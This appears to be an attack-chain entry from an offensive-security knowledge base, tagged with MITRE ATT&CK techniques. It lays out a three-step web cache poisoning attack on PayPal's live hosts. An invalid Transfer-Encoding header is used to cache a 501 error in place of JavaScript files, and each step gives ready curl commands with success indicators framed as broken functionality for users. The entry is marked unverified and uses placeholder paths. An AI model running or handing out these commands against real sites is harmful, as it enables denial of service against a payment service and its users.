---
tags:
  - web-cache-poisoning
  - dos
  - paypal
type: attack_chain
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Initial Access]]'
  - '[[Impact]]'
commands:
  - '[[commands/curl-send-invalid-transfer-encoding]]'
platforms:
  - Web
complexity: medium
procedures:
  - '[[procedures/Identify-Cache-Poisoning-Vulnerability]]'
  - '[[procedures/Craft-and-Send-Poisoning-Request]]'
  - '[[procedures/Verify-DoS-Impact]]'
step_count: 3
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Endpoint Denial of Service]]'
description: >-
  Exploitation of web cache poisoning vulnerability on PayPal using invalid
  Transfer-Encoding headers to cause denial of service by poisoning cached
  JavaScript files.
skill_level: intermediate
impact_level: high
id: abeabcd0-876f-4f42-9a95-0df8b653c7fa
created_at: '2025-12-11T06:10:40.126Z'
updated_at: '2025-12-11T06:10:40.126Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0001]]'
  - '[[TA0040]]'
mitre_techniques:
  - '[[T1190]]'
  - '[[T1499]]'
---
# Web Cache Poisoning via Invalid Transfer-Encoding on PayPal Leading to DoS

Multi-stage attack chain demonstrating web cache poisoning on PayPal's website to achieve denial of service.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Initial Discovery] --> B[Exploitation]
    B --> C[Verification]
    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
```

## Prerequisites & Requirements

### Required Tools

- [[tools/curl]]

### Target Environment

- Web platform (PayPal website)
- No specific ports required
- Network access to paypal.com and www.paypalobjects.com

### Initial Access Requirements

- Public internet access
- No credentials needed

## Detailed Attack Procedures

## Step 1: Discovery - [[procedures/Identify-Cache-Poisoning-Vulnerability]]

**Procedure**: [[procedures/Identify-Cache-Poisoning-Vulnerability]]

**Objective**: Test for improper handling of invalid Transfer-Encoding headers on the target website.

**Expected Output**: Identification of cacheable endpoints that can be poisoned with invalid headers.

First, use [[tools/curl]] to send test requests and observe cache behavior:

```bash
curl -H "Transfer-Encoding: chunked invalid" https://www.paypal.com/
```

Analyze the response for caching indicators and error handling.

**Success Indicators**:
- Server responds with an error but caches the response
- Cached content shows inconsistencies

## Step 2: Exploitation - [[procedures/Craft-and-Send-Poisoning-Request]]

**Procedure**: [[procedures/Craft-and-Send-Poisoning-Request]]

**Objective**: Poison the cache by sending requests that replace JavaScript files with a 501 error message.

**Expected Output**: Successful cache poisoning leading to erroneous responses for legitimate users.

Craft and send the poisoning request using [[commands/curl-send-invalid-transfer-encoding]]:

```bash
curl -H "Transfer-Encoding: chunked invalid" -H "Host: www.paypalobjects.com" https://www.paypal.com/path/to/js/file
```

This exploits the vulnerability to inject a '501 Not Implemented' error into the cache.

**Success Indicators**:
- Subsequent requests to the poisoned resource return the error
- Core functionality reliant on the JS files is disrupted

## Step 3: Verification - [[procedures/Verify-DoS-Impact]]

**Procedure**: [[procedures/Verify-DoS-Impact]]

**Objective**: Confirm the denial of service impact on PayPal's core functionality.

**Expected Output**: Observation of DoS effects on the website.

Request the poisoned JavaScript file:

```bash
curl https://www.paypalobjects.com/path/to/poisoned/js/file
```

Verify that the response is the '501 Not Implemented' error, indicating successful DoS.

**Success Indicators**:
- Users experience broken functionality
- Cache serves poisoned content

## Attack Chain Summary

### Key Achievements

1. Identification of cache poisoning vulnerability
2. Successful poisoning of JavaScript resources
3. Achievement of denial of service on core PayPal functionality

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[Endpoint Denial of Service]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Impact]]

*Last updated: 2023-10-01*
